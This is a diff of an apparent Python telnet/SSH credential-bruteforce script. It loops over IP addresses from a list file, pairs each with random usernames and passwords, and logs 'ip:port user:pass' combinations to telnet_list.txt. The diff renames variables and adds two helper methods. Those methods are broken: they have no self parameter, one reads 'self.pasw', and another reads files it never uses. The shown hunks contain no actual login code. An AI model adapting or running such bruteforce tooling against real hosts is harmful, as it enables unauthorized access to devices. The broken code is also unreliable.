@@ -53,9 +53,9 @@ combo_passw = [
 
 # searching for an existing lists
 try:
-	with open("list.txt", "r") as iplists:
-		combo_ip = iplists.readlines()
-		combo_ip = [ip.strip() for ip in combo_ip]
+	with open("list.txt", "r") as iplist:
+		sfw_combo = iplist.readlines()
+		sfw_combo = [ip.strip() for ip in sfw_combo]
 except:
 	print("\033[31mERRNO! No 'list.txt' found!\033[0m")
 	sys.exit()
@@ -68,7 +68,7 @@ class bruteforce:
 		self.port = port
 		self.user = user
 		self.passw = passw
-	def is_valid(self):
+	def is_usable(self):
 		if len(self.ip) > 1 and len(self.ip) >= 7 and self.ip.__contains__('.') and self.port == "23" and timeout_int <= 61 and timeout_int >= 2: # <--- remove or comment this!
 			file = open("telnet_list.txt", "a")
 			file.write(self.ip + ":" + self.port + " " + self.user + ":" + self.passw + "\n")
@@ -89,15 +89,29 @@ class bruteforce:
 			return (
 				"\033[35m" + self.ip + ":" + self.port + "\033[0m is \033[31mnot valid\033[0m!\033[35m 'critical error'\033[0m!"
 				)
+	def check_validity():
+		try:
+			with open("telnet_list.txt", "r") as check_validity:
+				is_valid = check_validity.readlines()
+				is_valid = [valid_combo.strip() for valid_combo in is_valid]
+			with open("ssh_list.txt", "r") as check_validity:
+				is_valid = check_validity.readlines()
+				is_valid = [valid_combo.strip() for valid_combo in is_valid]
+		except:
+			return
+	def store_data():
+		data = open("data.tmp", "a")
+		data.write(self.user+ self.pasw)		
 
 # start the bruteforce
 print("\033[H\033[J")
 time.sleep(timeout_int)
-for single_ip in combo_ip:
+for single_ip in sfw_combo:
 	random_user = random.choice(combo_user)
 	random_passw = random.choice(combo_passw)
 	config = (bruteforce(single_ip, port, random_user, random_passw))
-	print(config.is_valid())
+	print(config.is_usable())
 	time.sleep(timeout_int)
 print("\033[32mDone!\033[0m")
+
 sys.exit()
